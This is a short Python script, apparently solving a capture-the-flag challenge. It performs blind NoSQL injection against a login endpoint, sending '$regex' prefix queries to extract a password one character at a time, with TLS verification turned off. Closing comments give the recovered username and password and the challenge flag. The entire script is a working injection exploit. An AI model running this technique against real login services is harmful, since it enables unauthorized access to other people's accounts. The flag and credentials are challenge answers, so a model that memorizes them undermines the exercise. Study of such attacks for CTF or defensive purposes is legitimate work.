import requests
import urllib3
import string
import urllib
import time
urllib3.disable_warnings()

username=""
password=""
u="https://kunal-consulting.csd.lol/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s" }, "password": {"$regex": "^%s"}}' % (username, password + c)
            print(payload)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 200:
                print("Found one more char : %s" % (password+c))
                password += c
                break

# username= XhaNy22
# password = reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you

# csd{cOn5uL7iN9_CHIldR3N_5InC3_2009}
